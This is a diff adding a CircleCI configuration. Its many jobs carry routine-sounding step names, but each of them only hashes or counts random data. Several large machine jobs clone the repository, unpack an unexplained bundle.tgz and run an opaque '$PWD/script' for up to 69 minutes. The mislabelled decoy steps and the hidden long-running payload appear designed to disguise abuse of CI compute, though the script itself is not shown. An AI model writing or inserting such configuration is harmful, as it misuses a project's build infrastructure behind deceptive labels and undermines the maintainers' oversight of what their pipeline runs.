+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Flush temp bucket
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=19 2>/dev/null | sha256sum; true ; } > /tmp/handoff/40.out
+            len=$(wc -c </tmp/handoff/40.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 40.out
+  cerberus-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  env_andromeda:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 22099); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/handoff/passoff.txt
+            len=$(wc -c </tmp/handoff/passoff.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - passoff.txt
+  andromeda:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  loader_hotfix-7802:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 202898 | awk 'NR>25260 && NR<16034{s+=$1}END{print s}'; true ; } > /tmp/handoff/big_job_output_v1.out
+            len=$(wc -c </tmp/handoff/big_job_output_v1.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - big_job_output_v1.out
+  hotfix-7802:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/big_job_output_v1.out > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+  canary1_v2-nightly1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Harvest random seed
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 26000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/handoff/cache.dat
+            len=$(wc -c </tmp/handoff/cache.dat); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - cache.dat
+  v2-nightly1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inherit stage
+          command: |
+            { cat /tmp/handoff/secondary_step_output.txt > /dev/null; echo "read ok" ; } || true
+      - run:
+          name: Pull repo contents
+          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull static data
+          command: tar -xz -f bundle.tgz
+      - run:
+          no_output_timeout: 69m
+          command: "$PWD/script"
+
+  provision_INIT_UAT_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 5120 | wc -c; true ; } > /tmp/handoff/62.data
+            len=$(wc -c </tmp/handoff/62.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 62.data
+  B_hotfix-7802_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 921600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/handoff/big_job_output_v1.out
+            len=$(wc -c </tmp/handoff/big_job_output_v1.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - big_job_output_v1.out
+  red_STAGE_UAT_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 570320 | paste - - - - | wc -l; true ; } > /tmp/handoff/.ok
+            len=$(wc -c </tmp/handoff/.ok); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .ok
+  Beta_nico-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=2;a++)for(b=1;b<=14471;b++)s+=a*b;print s}'; true ; } > /tmp/handoff/buffer.dat
+            len=$(wc -c </tmp/handoff/buffer.dat); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - buffer.dat
+  generate_lima-8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 819200 | fold -w8 | sort -u | wc -l; true ; } > /tmp/handoff/relay.state
+            len=$(wc -c </tmp/handoff/relay.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - relay.state
+  B_auh-check_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 31784 | awk 'END{print NR}'; true ; } > /tmp/handoff/primary_phase_output.out
+            len=$(wc -c </tmp/handoff/primary_phase_output.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - primary_phase_output.out
+  reset_canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 10M /dev/urandom | base64 | wc -c; true ; } > /tmp/handoff/2024-05-05.data
+            len=$(wc -c </tmp/handoff/2024-05-05.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 2024-05-05.data
+  spin_strated_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=432493;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/handoff/handoff.sig
+            len=$(wc -c </tmp/handoff/handoff.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - handoff.sig
+  wire_java17-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Chunk raw buffer
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<297427;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/handoff/step-24.log
+            len=$(wc -c </tmp/handoff/step-24.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-24.log
+  db_fix-session-crash_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 6291456 | fold -w16 | sort -u | wc -l; true ; } > /tmp/handoff/summary.txt
+            len=$(wc -c </tmp/handoff/summary.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - summary.txt
+  step1_green-light_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 453326 | awk 'NR>22434 && NR<54398{s+=$1}END{print s}'; true ; } > /tmp/handoff/36.out
+            len=$(wc -c </tmp/handoff/36.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 36.out
+  runner_smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 18874368 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/handoff/artifact
+            len=$(wc -c </tmp/handoff/artifact); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - artifact
+  prep_Launch_Staging6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=2;a++)for(b=1;b<=29183;b++)s+=a*b;print s}'; true ; } > /tmp/handoff/trace.log
+            len=$(wc -c </tmp/handoff/trace.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.log
+  produce_tb-01_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Project tail bytes
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<327375;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/handoff/54.blob
+            len=$(wc -c </tmp/handoff/54.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 54.blob
+  warmer_node18-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=7;a++)for(b=1;b<=16106;b++)s+=a*b;print s}'; true ; } > /tmp/handoff/OK
+            len=$(wc -c </tmp/handoff/OK); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - OK
+  fetcher_Ship_Pipeline1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 51200 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/handoff/stash.raw
+            len=$(wc -c </tmp/handoff/stash.raw); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.raw
+  env_assemble-partial-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Churn allocator pool
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 2500 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/handoff/gate-complete.sig
+            len=$(wc -c </tmp/handoff/gate-complete.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - gate-complete.sig
+  warmer_ship-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes abc | head -n 46994 | sha256sum; true ; } > /tmp/handoff/step-28.txt
+            len=$(wc -c </tmp/handoff/step-28.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-28.txt
+workflows:
+  all:
+    jobs:
+      - resync_update-router-v2-crash
+      - p1_feat-7594
+      - env_andromeda
+      - update-router-v2-crash:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - feat-7594:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - andromeda:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - go1-21-test:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - v2-nightly1:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - package:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - b:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - pr-new:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - check-partial-release-candidate:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - cerberus-ng:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - WEB-661:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - hotfix-8520:
+          requires:
+            - resync_update-router-v2-crash
+            - p1_feat-7594
+            - env_andromeda
+      - vendor_INIT_UAT
+      - provision_INIT_UAT_2:
+          requires:
+            - vendor_INIT_UAT
+      - INIT_UAT:
+          requires:
+            - provision_INIT_UAT_2
+      - loader_hotfix-7802:
+          requires:
+            - provision_INIT_UAT_2
+      - B_hotfix-7802_2:
+          requires:
+            - loader_hotfix-7802
+      - hotfix-7802:
+          requires:
+            - B_hotfix-7802_2
+      - beta_STAGE_UAT:
+          requires:
+            - B_hotfix-7802_2
+      - red_STAGE_UAT_2:
+          requires:
+            - beta_STAGE_UAT
+      - STAGE_UAT:
+          requires:
+            - red_STAGE_UAT_2
+      - cache_nico-ci:
+          requires:
+            - red_STAGE_UAT_2
+      - Beta_nico-ci_2:
+          requires:
+            - cache_nico-ci
+      - nico-ci:
+          requires:
+            - Beta_nico-ci_2
+      - redo_lima-8:
+          requires:
+            - Beta_nico-ci_2
+      - generate_lima-8_2:
+          requires:
+            - redo_lima-8
+      - lima-8:
+          requires:
+            - generate_lima-8_2
+      - warmer_auh-check:
+          requires:
+            - generate_lima-8_2
+      - B_auh-check_2:
+          requires:
+            - warmer_auh-check
+      - auh-check:
+          requires:
+            - B_auh-check_2
+      - fetcher_canary:
+          requires:
+            - B_auh-check_2
+      - reset_canary_2:
+          requires:
+            - fetcher_canary
+      - canary:
+          requires:
+            - reset_canary_2
+      - package_strated:
+          requires:
+            - reset_canary_2
+      - spin_strated_2:
+          requires:
+            - package_strated
+      - strated:
+          requires:
+            - spin_strated_2
+      - runner_java17-ship:
+          requires:
+            - spin_strated_2
+      - wire_java17-ship_2:
+          requires:
+            - runner_java17-ship
+      - java17-ship:
+          requires:
+            - wire_java17-ship_2
+      - round2_fix-session-crash
+      - db_fix-session-crash_2:
+          requires:
+            - round2_fix-session-crash
+      - fix-session-crash:
+          requires:
+            - db_fix-session-crash_2
+      - drain_green-light:
+          requires:
+            - db_fix-session-crash_2
+      - step1_green-light_2:
+          requires:
+            - drain_green-light
+      - green-light:
+          requires:
+            - step1_green-light_2
+      - stepB_smoke:
+          requires:
+            - step1_green-light_2
+      - runner_smoke_2:
+          requires:
+            - stepB_smoke
+      - smoke:
+          requires:
+            - runner_smoke_2
+      - alpha_Launch_Staging6:
+          requires:
+            - runner_smoke_2
+      - prep_Launch_Staging6_2:
+          requires:
+            - alpha_Launch_Staging6
+      - Launch_Staging6:
+          requires:
+            - prep_Launch_Staging6_2
+      - go_tb-01:
+          requires:
+            - prep_Launch_Staging6_2
+      - produce_tb-01_2:
+          requires:
+            - go_tb-01
+      - tb-01:
+          requires:
+            - produce_tb-01_2
+      - preinit_node18-test
+      - warmer_node18-test_2:
+          requires:
+            - preinit_node18-test
+      - node18-test:
+          requires:
+            - warmer_node18-test_2
+      - run_Ship_Pipeline1:
+          requires:
+            - warmer_node18-test_2
+      - fetcher_Ship_Pipeline1_2:
+          requires:
+            - run_Ship_Pipeline1
+      - Ship_Pipeline1:
+          requires:
+            - fetcher_Ship_Pipeline1_2
+      - phase1_assemble-partial-release-candidate:
+          requires:
+            - fetcher_Ship_Pipeline1_2
+      - env_assemble-partial-release-candidate_2:
+          requires:
+            - phase1_assemble-partial-release-candidate
+      - assemble-partial-release-candidate:
+          requires:
+            - env_assemble-partial-release-candidate_2
+      - install_ship-it:
+          requires:
+            - env_assemble-partial-release-candidate_2
+      - warmer_ship-it_2:
+          requires:
+            - install_ship-it
+      - ship-it:
+          requires:
+            - warmer_ship-it_2
